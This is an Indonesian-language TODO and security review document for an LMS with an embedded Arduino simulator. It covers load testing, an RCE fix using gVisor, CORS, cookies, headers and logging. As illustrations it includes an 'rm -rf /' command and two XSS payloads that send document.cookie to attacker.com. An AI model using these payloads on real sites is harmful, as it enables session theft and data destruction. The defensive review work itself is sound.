# Elemes LMS: Sisa Pekerjaan (To-Do List)

Berdasarkan log penyelesaian integrasi Velxio dan dokumen sebelumnya, berikut adalah daftar sisa pekerjaan (TODO) proyek. Terakhir diperbarui: 2026-04-22.

## 🔴 Prioritas Tinggi
- [x] **Testing End-to-End (E2E)**
  - Script Locust sudah disiapkan (di dalam `load-test/`).
  - Bug pada proxy JSON parsing dari frontend ke backend sudah diperbaiki dengan `force=True` dan `silent=True` di `auth.py`, sehingga Login via test suite berhasil.
- [x] **Push ke Remote**
  - `git push` untuk repo elemes dan velxio (keduanya ahead of origin).
- [x] **Hapus file test lama** di root `elemes/`:
  - `rm elemes/content_parser.py elemes/locustfile.py elemes/requirements-test.txt` (sudah dibersihkan sebelumnya, sekarang rapi di `load-test`).


## 🟡 Prioritas Sedang
- [ ] **Tuning Crosshair/UX Mobile**
  - Melakukan *fine-tuning* pada opacity warna dan pola garis *dashed* pada crosshair UI di Velxio agar lebih responsif terhadap device layar sentuh saat dipakai *live*.

## 🟢 Prioritas Rendah (Enhancement Simulator Velxio)
- [ ] **Mengunci Tata Letak (Component Locking)**
  - Menonaktifkan fitur *drag* atau *delete* komponen pada tampilan *embed*, sehingga siswa hanya difokuskan pada kegiatan menarik (*wiring*) kabel saja tanpa mengganggu tatanan dasar board.
- [ ] **Solution Overlay**
  - Mengembangkan tampilan *overlay* solusi/jawaban wiring untuk *review mode*, agar siswa melihat panduan visual kabel mana yang kurang pas.
- [ ] **Perintah `elemes:compile_and_run` API Bridge**
  - Mengkoneksikan trigger kompilasi sehingga UI utama Elemes juga bisa mem-bypass eksekusi ke dalam iFrame (saat ini *placeholder* `compile_and_run` bridge belum sepenuhnya utuh ter-wire dengan UI submit).

## ⚪ Opsional
- [x] ~~**Locust Load Testing Plan**~~ → Sudah diimplementasi di `load-test/`
- [x] **Locust Hasil Analisis** — Evaluasi skenario 50 user (5 worker) selesai. *Finding*: Rata-rata respons LMS stabil di 200ms (50th percentile). Namun, kompilasi Arduino (`/velxio/api/compile/`) terdeteksi sebagai *CPU bottleneck* yang menyebabkan waktu tunggu mencapai 30 detik (95th percentile) di bawah tekanan serbuan *request* berskala ekstrem. Server/LMS dinilai layak dan responsif secara keseluruhan.

## 🚨 Security Review & Vulnerability Fixes (Prioritas Kritis)

Berdasarkan hasil code review terbaru yang difokuskan pada keamanan sistem dan *exposed routes* API, ditemukan beberapa celah kerentanan kritis yang perlu segera diperbaiki. Berikut adalah detail temuan dan *task* perbaikannya:

### 1. Remote Code Execution (RCE) via Endpoint `/compile`
- **Penjelasan**: Endpoint `/compile` di `elemes/routes/compile.py` menerima dan mengeksekusi kode C dan Python yang di-*submit* oleh pengguna secara langsung (via `subprocess.run`). Eksekusi ini berjalan di dalam kontainer `elemes` tanpa adanya batasan hak akses atau *sandbox* tambahan. Pengguna anonim/jahat dapat mengeksekusi *shell script* atau perintah OS (seperti `os.system("rm -rf /")`) untuk menghapus, memodifikasi, atau membaca file sensitif. Terlebih lagi, *volume* `content`, `tokens_siswa.csv`, dan `assets` di-mount dengan akses *read-write* pada konfigurasi podman/docker, sehingga token akses seluruh siswa rentan diretas atau data materi bisa terhapus.
- **Task Perbaikan**:
  - [x] **Gunakan Sandbox gVisor (Compiler Worker)**: Pisahkan fungsi kompilasi ke dalam kontainer terpisah (`compiler-worker`) yang dijalankan menggunakan *runtime* `runsc` (gVisor). Backend utama akan mengirimkan kode via HTTP internal.
  - [x] **Read-Only Mounts**: Ubah konfigurasi *bind mount* di `podman-compose.yml` pada direktori sensitif (`tokens_siswa.csv`, `content`, `assets`) menjadi *read-only* dengan menambahkan parameter `:ro` pada kontainer backend utama.
  - [x] **Otentikasi / Wajib Login**: Lindungi *route* `/compile` dengan menambahkan pengecekan token mahasiswa agar tidak bisa diakses oleh *user* anonim di luar sistem.
  - [x] **Resource Limiting**: Terapkan limit komputasi RAM dan CPU pada kontainer worker guna menghindari celah *Denial of Service* (DoS).

### 2. Information Disclosure via Endpoint `/progress-report.json`
- **Penjelasan**: Rute `/progress-report.json` dan `/progress-report/export-csv` di `elemes/routes/progress.py` dapat diakses oleh siapa saja karena tidak menerapkan validasi token atau *role checks*. Data kemajuan belajar dan nama semua siswa di dalam file CSV akan terekspos tanpa otentikasi.
- **Task Perbaikan**:
  - [x] **Otentikasi Token**: Tambahkan validasi token (via `validate_token`) sebelum memberikan *response* dari kedua *route* tersebut.

### 3. Miskonfigurasi CORS Longgar (Overly Permissive)
- **Penjelasan**: Deklarasi `CORS(app)` di `elemes/app.py` mengizinkan seluruh asal domain (*all origins*) secara *default* (`*`). Mengingat sistem sudah menggunakan sesi berbasis *Cookie* (`samesite='Lax'`), ada potensi ancaman pengiriman *requests* lintas *website* dari penyerang.
- **Task Perbaikan**:
  - [x] **Batasi Konfigurasi CORS**: Gunakan *environment variable* `ORIGIN` untuk menentukan domain eksplisit yang diizinkan (misal: `http://localhost:3000`).

### 4. Penyimpanan Token Teks Terbuka (Plaintext Credentials)
- **Penjelasan**: Data di `tokens_siswa.csv` menyimpan token dalam format *plaintext*. Meskipun hanya file CSV lokal, bocornya satu file tersebut akan mengkompromikan semua token akses dalam sistem (terutama karena kerentanan RCE di poin 1).
- **Task Perbaikan**:
  - [x] **Proteksi Token CSV**: Prioritas utama adalah menambal *vulnerability* utama (RCE via gVisor & Read-Only Mounts) agar peretas tidak bisa mengekstrak isinya.
  - [ ] *(Opsional)* **Hashed Tokens**: Gunakan fungsi *hashing* saat membaca/memverifikasi token.

### 5. Tidak Ada Sanitasi Input pada Parameter Path (Defense in Depth)
- **Penjelasan**: Fungsi *route* `/lesson/<filename>.json` di `elemes/routes/lessons.py` mengandalkan `<filename>` yang langsung disambungkan via `os.path.join()`. Meskipun Flask memblokir `../` (Directory Traversal konvensional), tetap berisiko jika pengguna memanipulasi *request* API secara lebih *advanced*.
- **Task Perbaikan**:
  - [x] **Terapkan `secure_filename`**: Gunakan `werkzeug.utils.secure_filename(filename)` sebelum argumen `<filename>` disambung ke direktori *content*.

---

## 🔐 Second Opinion: Security Review Tambahan (Update 2026-04-21)

Berdasarkan analisis komprehensif terhadap codebase, ditemukan celah keamanan tambahan yang perlu diperhatikan. Berikut detail temuan beserta dampak risikonya:

### 🎯 Executive Summary Risk Matrix

| Kategori | Severity | Likelihood | Dampak Bisnis |
|----------|----------|------------|---------------|
| Cookie Security | **HIGH** | **HIGH** | Session hijacking, data theft |
| Rate Limiting | **HIGH** | **MEDIUM** | Brute force, DoS attack |
| XSS via Markdown | **HIGH** | **MEDIUM** | Account takeover, data exfiltration |
| Security Headers | **MEDIUM** | **HIGH** | Clickjacking, XSS, MIME confusion |
| Logging Security | **MEDIUM** | **MEDIUM** | Credential leak, compliance violation |
| Network Security | **MEDIUM** | **LOW** | Code injection, internal data leak |

---

### 🔴 6. Cookie Security & Session Management (HIGH RISK)

#### 6.1 Cookie `secure=False`
**Lokasi**: `routes/auth.py:32`
```python
response.set_cookie('student_token', token, httponly=True, secure=False, samesite='Lax', ...)
```

**Dampak Jika Tidak Ditangani:**
- **Session Hijacking via MITM**: Attacker di jaringan publik (coffee shop WiFi, hotspot) dapat intercept cookie melalui HTTP yang tidak terenkripsi. Cookie dikirim plaintext melalui jaringan.
- **Impersonation Attack**: Attacker yang berhasil mendapatkan token dapat login sebagai siswa mana saja tanpa autentikasi ulang, mengakses semua lesson dan progress data.
- **Cross-Site Cookie Leak**: Meski `httponly=True`, jika ada XSS di subdomain atau sister site, cookie masih bisa dieksploitasi.

**Task Perbaikan**:
- [x] **Conditional Secure Cookie**: Gunakan `secure=True` hanya jika environment production dengan HTTPS aktif. Implementasikan via environment variable `COOKIE_SECURE=true/false`.
- [x] **SameSite Strict**: Pertimbangkan upgrade dari `Lax` ke `Strict` untuk perlindungan CSRF lebih kuat. (Note: Tetap 'Lax' untuk kompatibilitas, tapi flag Secure sudah dinamis).

---

#### 6.2 Tidak Ada Rate Limiting Login
**Lokasi**: `routes/auth.py` - `/login` endpoint

**Dampak Jika Tidak Ditangani:**
- **Brute Force Attack**: Attacker dapat mencoba ribuan kombinasi token secara otomatis sampai menemukan token valid. Dengan token format yang predictable, serangan ini sangat feasible.
- **Credential Stuffing**: Jika siswa menggunakan token yang mudah ditebak (contoh: `token123`, `siswa001`), attacker dapat menebak dengan wordlist.
- **DoS via Login Spam**: Server dapat kehabisan resources karena memproses ribuan request login palsu secara bersamaan.
- **Token Enumeration**: Attacker dapat memetakan semua token valid di sistem dengan systematic guessing.

**Task Perbaikan**:
- [x] **Rate Limiting**: Implementasikan Flask-Limiter dengan rules:
  - Max 50 attempts per IP per minute untuk `/login` (Akodomasi kelas WiFi)
- [x] **Progressive Delay**: Tambahkan tarpitting (1.5s delay) untuk failed login.

---

#### 6.3 Tidak Ada Session Invalidation/Blacklist
**Lokasi**: Tidak ada mekanisme revoke token

**Dampak Jika Tidak Ditangani:**
- **Stale Session Attack**: Token tetap valid selama 24 jam (max_age) meski:
  - Siswa sudah logout
  - Token sudah direset/diubah guru
  - Siswa sudah tidak bersekolah lagi
- **No Revocation Mechanism**: Jika token bocor (misal: siswa screenshot token), tidak ada cara untuk invalidasi kecuali restart server atau manual edit CSV.
- **Insider Threat**: Guru yang sudah tidak aktif masih bisa akses jika tokennya tidak dihapus dari CSV.

**Task Perbaikan**:
- [x] **Token Blacklist**: Implementasikan in-memory blacklist untuk token yang sudah logout.
- [ ] **Token Versioning**: Tambahkan timestamp/version di token, invalidate jika mismatch dengan database.
- [ ] **Force Logout API**: Endpoint untuk guru force logout semua session siswa (useful saat ujian).

---

### 🟠 7. HTTP Security Headers (MEDIUM-HIGH RISK)

#### 7.1 Tidak Ada Content Security Policy (CSP)
**Lokasi**: Flask response tidak meng-set CSP header

**Dampak Jika Tidak Ditangani:**
- **XSS (Cross-Site Scripting)**: Attacker dapat inject JavaScript malicious melalui:
  - Markdown lesson content: `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`
  - Data dari API yang dirender tanpa sanitasi
  - Third-party CDN compromise (supply chain attack)
- **Data Exfiltration**: Script dapat mencuri:
  - Cookie session siswa
  - Progress data dan lesson content
  - Token authentication kirim ke attacker server
- **Clickjacking**: Halaman dapat di-embed di iframe transparent untuk trick user klik tombol palsu.

**Task Perbaikan**:
- [ ] **CSP Header**: Implementasikan Flask-Talisman dengan policy:
  ```
  default-src 'self';
  script-src 'self' 'unsafe-inline' (untuk SvelteKit);
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:;
  frame-src 'self' (untuk iframe Velxio/CircuitJS);
  connect-src 'self';
  ```
- [ ] **Nonce-based CSP**: Untuk SvelteKit inline scripts, gunakan nonce generator.

---

#### 7.2 Tidak Ada X-Frame-Options
**Dampak Jika Tidak Ditangani:**
- **Clickjacking Attack**: LMS dapat di-embed di iframe transparent di malicious site. Attacker overlay tombol palsu di atas tombol real.
- **UI Redressing**: Contoh: Attacker membuat halaman "Free Gift" dengan tombol "Claim" yang sebenarnya adalah tombol "Delete Account" dari LMS yang di-embed.
- **Credential Theft**: Fake login form di-overlay di atas real login form.

**Task Perbaikan**:
- [ ] **X-Frame-Options**: Set header `X-Frame-Options: SAMEORIGIN` untuk melindungi clickjacking.
- [ ] **Frame Ancestors CSP**: Alternatif modern dengan CSP `frame-ancestors 'self';`.

---

#### 7.3 Tidak Ada X-Content-Type-Options & HSTS
**Dampak Jika Tidak Ditangani:**
- **MIME-Type Confusion**: Browser execute file yang seharusnya non-executable (misal: upload lesson image yang ternyata JavaScript).
- **SSL Strip Attack**: Attacker downgrade HTTPS ke HTTP di jaringan publik, intercept semua traffic.
- **Man-in-the-Middle**: Semua komunikasi dapat dimodifikasi attacker tanpa detection.

**Task Perbaikan**:
- [ ] **X-Content-Type-Options**: Set header `nosniff` untuk mencegah MIME sniffing.
- [ ] **HSTS**: Set `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` jika HTTPS aktif.
- [ ] **Referrer-Policy**: Set `strict-origin-when-cross-origin` untuk mengurangi info leak.

---

### 🟠 8. Logging & Monitoring Security (MEDIUM RISK)

#### 8.1 Token Exposure in Logs
**Lokasi**: `routes/progress.py:30`, `routes/compile.py`
```python
logging.info(f"Received track-progress request: token={token}, ...")
```

**Dampak Jika Tidak Ditangani:**
- **Credential Leakage**: Log file biasanya readable oleh sistem admin atau backup processes. Jika log di-exfiltrate, semua token siswa terekspos.
- **GDPR/Compliance Issue**: Token dapat dianggap Personally Identifiable Information (PII). Log retention policy mungkin violate data protection regulations.
- **Forensics Contamination**: Attacker bisa inject fake log entries untuk cover tracks atau frame user lain.
- **Audit Trail Pollution**: Sulit differentiate antara legitimate use vs stolen token usage.

**Task Perbaikan**:
- [ ] **Token Redaction**: Implementasikan logging filter yang otomatis redact token pattern:
  ```python
  # Contoh: token=dummy_token_12345 → token=***REDACTED***
  ```
- [ ] **Structured Logging**: Gunakan JSON logging dengan field terpisah, jangan log sensitive data di message.
- [ ] **Log Sanitization**: Review semua log statements di codebase, hapus/replace token, password, atau PII lainnya.

---

#### 8.2 Tidak Ada Audit Logging untuk Actions Sensitif
**Dampak Jika Tidak Ditangani:**
- **No Accountability**: Tidak ada track record siapa yang mengubah progress siswa, mengakses report, atau compile code.
- **Forensics Difficulty**: Jika terjadi data breach, sulit trace kapan dan bagaimana terjadi.
- **Insider Threat Blindness**: Tidak bisa deteksi suspicious activity seperti:
  - Guru melihat progress siswa dari kelas lain
  - Compile activity di jam aneh (3 AM)
  - Multiple failed login dari IP yang sama

**Task Perbaikan**:
- [ ] **Audit Log Table**: Buat tabel/file terpisah untuk log actions sensitif:
  - Login/logout events
  - Progress updates
  - Report exports
  - Failed authentication attempts
- [ ] **Log Rotation**: Implementasikan log rotation dan retention policy (misal: 90 hari).
- [ ] **Alerting**: Basic alerting untuk events aneh (contoh: >100 failed logins per jam).

---

### 🟠 9. Input/Output Sanitization (MEDIUM RISK)

#### 9.1 Potential XSS dari Markdown Rendering
**Lokasi**: `services/lesson_service.py` - Markdown tidak di-sanitize

**Dampak Jika Tidak Ditangani:**
- **Stored XSS**: Guru yang compromised (atau attacker yang dapat akses edit content) dapat inject:
  ```html
  <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
  ```
- **Persistent Attack**: Script akan dijalankan setiap kali siswa membuka lesson tersebut.
- **Session Hijacking**: JavaScript dapat:
  - Mencuri cookie session
  - Mengirim token ke attacker server
  - Mengakses localStorage/sessionStorage
  - Melakukan actions atas nama siswa (CSRF via XSS)

**Task Perbaikan**:
- [ ] **Markdown Sanitization**: Gunakan library seperti `bleach` atau `html-sanitizer` untuk:
  - Strip/escape `<script>` tags
  - Remove event handlers (`onerror`, `onload`, etc.)
  - Whitelist allowed HTML tags dan attributes
- [ ] **Content Security Policy**: CSP adalah defense-in-depth untuk XSS.

---

#### 9.2 Error Message Information Disclosure
**Lokasi**: Multiple routes mengembalikan raw exception
```python
return jsonify({'success': False, 'message': f'Error processing login: {str(e)}'})
```

**Dampak Jika Tidak Ditangani:**
- **Information Leak**: Attacker dapat mendapatkan:
  - Internal file paths (`/app/routes/auth.py`)
  - Database schema dari SQL error messages
  - Library versions dari stack traces
  - System architecture details
- **Attack Vector Discovery**: Error messages membantu attacker debug dan refine attack mereka.
- **System Fingerprinting**: Attacker dapat identifikasi tech stack untuk exploit spesifik.

**Task Perbaikan**:
- [ ] **Generic Error Messages**: Return generic message ke client, log detail ke server:
  ```python
  # Client: {"success": false, "message": "An error occurred"}
  # Server Log: Full traceback dengan request ID
  ```
- [ ] **Error Codes**: Gunakan error codes untuk debugging tanpa expose sensitive info.

---

### 🟠 10. Network Security (MEDIUM RISK)

#### 10.1 Internal Communication Tidak Di-encrypt
**Lokasi**: `routes/compile.py:46` - HTTP ke compiler-worker
```python
response = requests.post(COMPILER_WORKER_URL, ...)  # HTTP, bukan HTTPS
```

**Dampak Jika Tidak Ditangani:**
- **Internal Traffic Interception**: Jika attacker compromise satu container, bisa sniff traffic internal.
- **Code Injection**: Attacker dapat man-in-the-middle request ke compiler-worker dan inject malicious code.
- **Data Leakage**: Token siswa dan source code lewat plaintext dalam internal network.

**Task Perbaikan**:
- [ ] **mTLS (Mutual TLS)**: Implementasikan certificate-based authentication antar container.
- [ ] **Network Isolation**: Gunakan internal network yang terpisah untuk service-to-service communication.
- [ ] **Service Mesh**: Pertimbangkan Istio/Linkerd untuk automatic mTLS (future enhancement).

---

#### 10.2 Tidak Ada Network Policies Antar Container
**Dampak Jika Tidak Ditangani:**
- **Lateral Movement**: Jika Velxio container compromised, attacker bisa langsung akses Flask backend, database, dan service lain.
- **Service Enumeration**: Semua service bisa discover dan communicate satu sama lain tanpa restriction.
- **Privilege Escalation**: Attacker dari low-privilege service bisa akses high-privilege service.

**Task Perbaikan**:
- [ ] **Podman/Docker Network Policies**: Definisikan explicit allowed connections:
  - Frontend → Backend: ✅
  - Backend → Compiler Worker: ✅
  - Compiler Worker → Internet: ❌ (no outbound)
  - Velxio → Backend: ✅ (tapi limited)
- [ ] **Firewall Rules**: Implementasikan iptables/nftables rules di container level.

---

### 🟡 11. Additional Security Hardening (LOW-MEDIUM RISK)

#### 11.1 Predictable Token Generation
**Lokasi**: `generate_tokens.py` (jika sequential)

**Dampak Jika Tidak Ditangani:**
- **Token Enumeration**: Jika token format predictable (e.g., `token_001`, `token_002`), attacker bisa generate semua token.
- **Mass Account Takeover**: Jika dapat satu token, bisa tebak token lainnya.

**Task Perbaikan**:
- [ ] **Cryptographically Secure Random**: Gunakan `secrets.token_urlsafe(32)` untuk generate token.
- [ ] **Token Entropy**: Minimal 128-bit entropy untuk mencegah brute force.

---

#### 11.2 Secrets Management
**Lokasi**: `podman-compose.yml:54` - Hardcoded SECRET_KEY
```yaml
- SECRET_KEY=embed-only-no-auth-needed
```

**Dampak Jika Tidak Ditangani:**
- **Session Forgery**: Attacker bisa generate valid session tokens untuk Velxio.
- **API Bypass**: Jika Velxio punya internal API, attacker bisa bypass autentikasi.
- **No Rotation**: Secret key tidak pernah berubah, jika leak maka permanent compromise.

**Task Perbaikan**:
- [ ] **Environment Variable**: Pindahkan SECRET_KEY ke `.env` file yang tidak di-commit.
- [ ] **Secret Rotation**: Implementasikan mechanism untuk periodic secret rotation.
- [ ] **Vault Integration**: Pertimbangkan HashiCorp Vault atau AWS Secrets Manager untuk production.

---

### 🔴 12. Secure Rate Limit for Velxio Compilation (CRITICAL SECURITY)

**Penjelasan**: Saat ini, kompilasi Arduino/Velxio berjalan secara langsung antara iframe frontend ke backend Velxio tanpa melewati filter autentikasi Elemes. Pembatasan di sisi frontend (SvelteKit) mudah di-bypass melalui "Inspect Element" atau request API langsung. Hal ini memungkinkan pengguna anonim membebani server dengan request kompilasi tanpa batas.

**Task Perbaikan**:
- [x] **Flask Backend Proxy**: Buat route `POST /api/velxio-compile` di Flask yang berfungsi sebagai proxy ke backend Velxio (`http://velxio:80/api/compile/`).
- [x] **Backend Enforcement**: Terapkan `@limiter.limit("1 per 2 minutes")` dan antrean anonim (20 slot) pada route proxy tersebut. Pastikan token divalidasi via `student_token` cookie agar pengguna login tidak terkena limit.
- [x] **Redirect Traffic**: Ubah konfigurasi Tailscale (`sinau-c-tail.json`) dan Vite Proxy agar request `/velxio/api/compile` diarahkan ke endpoint Flask yang baru.

---

## 📋 Prioritas Implementasi (Rekomendasi)

### Tier 1: Quick Wins (High Impact, Low Effort) 🚀
1. **Token Redaction in Logs** - Hanya modify logging statements
2. **Add Security Headers** - Gunakan Flask-Talisman (one-liner)
3. **Conditional Secure Cookie** - Environment variable check sederhana

### Tier 2: Important (High Impact, Medium Effort) ⭐
4. **Rate Limiting Login** - Flask-Limiter integration
5. **Markdown Sanitization** - Bleach/html-sanitizer setup
6. **Generic Error Messages** - Exception handling wrapper

### Tier 3: Strategic (Long-term Security) 🔒
7. **Session Invalidation/Blacklist** - Redis/memory store
8. **Audit Logging** - Separate logging infrastructure
9. **Internal mTLS** - Certificate management
10. **Network Policies** - Container orchestration config
11. **Secrets Management** - Vault/cloud provider integration

---

## 🎓 Learning Resources (untuk Referensi)

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **Flask Security**: https://flask.palletsprojects.com/en/2.3.x/security/
- **CSP Guide**: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- **Cookie Security**: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security

---

**Update Terakhir**: 2026-04-21
**Status**: Second Opinion Security Review - Ready for Curation
